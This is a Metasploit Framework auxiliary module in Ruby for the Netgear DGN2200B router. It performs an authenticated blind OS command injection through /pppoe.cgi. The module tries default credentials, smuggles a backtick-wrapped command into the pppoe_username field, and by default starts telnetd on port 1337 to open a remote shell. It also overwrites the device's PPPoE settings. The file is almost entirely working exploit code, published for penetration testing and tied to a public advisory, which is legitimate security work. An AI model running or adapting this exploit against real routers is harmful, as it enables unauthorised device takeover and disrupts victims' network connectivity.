##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Netgear DGN2200B Remote Command Execution',
			'Description'     => %q{
					Some Netgear Routers are vulnerable to OS Command injection.
				You will need credentials to the webinterface to access the vulnerable part
				of the application. Default credentials are always a good starting point.
				admin/admin or admin and password as pass could be a first try.
				Note: This is a blind os command injection vulnerability. This means that you will
				not see any output of your command. Try a ping command to your local system for a
				first test.

				Warning: We overwrite the PPOE Settings. So save them!

				Hint: To get a remote shell you could start the telnetd of the device.
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.netgear.com/home/products/wirelessrouters/work-and-play/dgn2200.aspx#' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-015' ],
					[ 'BID', '57998' ],
					[ 'EDB', '24513' ],
					[ 'OSVDB', '90320' ]
				],
			'DisclosureDate' => 'Feb 10 2013'))

		register_options(
			[
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
				OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
			], self.class)
	end

	def run
		uri = "/pppoe.cgi"
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		vprint_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		begin
			res = send_request_cgi({
				'uri'     => uri,
				'method'  => 'GET',
				'authorization' => basic_auth(user,pass)
				})

				unless (res.kind_of? Rex::Proto::Http::Response)
					vprint_error("#{rhost}:#{rport} - #{target_url} not responding")
				end

				return if res.nil?
				return if (res.code == 404)

				if [200, 301, 302].include?(res.code)
					print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
				else
					vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
					return
				end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end

		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		#encode our command and do not use encoding of the whole request
		cmd = Rex::Text.uri_encode(datastore['CMD'])

		#original request:
		#data_cmd = "login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20#{cmd}%20%26&
		#pppoe_passwd=test123&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5&WANAssign=Dynamic&
		#DNSAssign=0&en_nat=1&MACAssign=0&apply=%C3%9Cbernehmen&runtest=yes&wan_ipaddr=0.0.0.0&
		#pppoe_localip=0.0.0.0&wan_dns_sel=0&wan_dns1_pri=0.0.0.0&wan_dns1_sec=...&wan_hwaddr_sel=0&
		#wan_hwaddr_def=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr2=84%3A1B%3A5E%3A01%3AE7%3A05&
		#wan_hwaddr_pc=5C%3A26%3A0A%3A2B%3AF0%3A3F&wan_nat=1&opendns_parental_ctrl=0&pppoe_flet_sel=&
		#pppoe_flet_type=&pppoe_temp=&opendns_parental_ctrl=0"

		vprint_line("#{rhost}:#{rport} - using the following target URL: #{uri}")

		begin
			res = send_request_cgi(
				{
					'uri'	=> uri,
					'method' => 'POST',
					'authorization' => basic_auth(user,pass),
					#not working without this:
					'encode_params' => false,
					'vars_post' => {
						"login_type" => "PPPoE(PPP+over+Ethernet)",
						#"pppoe_username" => "%26#{cmd}%26",
						"pppoe_username" => "`#{cmd}`",
						"pppoe_passwd" => "test123",
						"pppoe_servicename" => "",
						"pppoe_dod" => "1",
						"pppoe_idletime" => "5",
						"WANAssign" => "Dynamic",
						"DNSAssign" => "0",
						"en_nat" => "1",
						"MACAssign" => "0",
						"apply" => "%C3%9Cbernehmen",
						"runtest" => "yes",
						"wan_ipaddr" => "0.0.0.0",
						"pppoe_localip" => "0.0.0.0",
						"wan_dns_sel" => "0",
						"wan_dns1_pri" => "0.0.0.0",
						"wan_dns1_sec" => "...",
						"wan_hwaddr_sel" => "0",
						"wan_hwaddr_def" => "84:1B:5E:E1:E1:E1",
						"wan_hwaddr2" => "84:1B:5E:E1:E1:E1",
						"wan_hwaddr_pc" => "5C:26:0A:E1:E1:E1",
						"wan_nat" => "1",
						"opendns_parental_ctrl" => "0",
						"pppoe_flet_sel" => "",
						"pppoe_flet_type" => "",
						"pppoe_temp" => "",
						"opendns_parental_ctrl" => "0"
						}
				})
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end
		print_status("#{rhost}:#{rport} - sleeping 30 seconds till the configuration is activated ...")
		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
	end
end
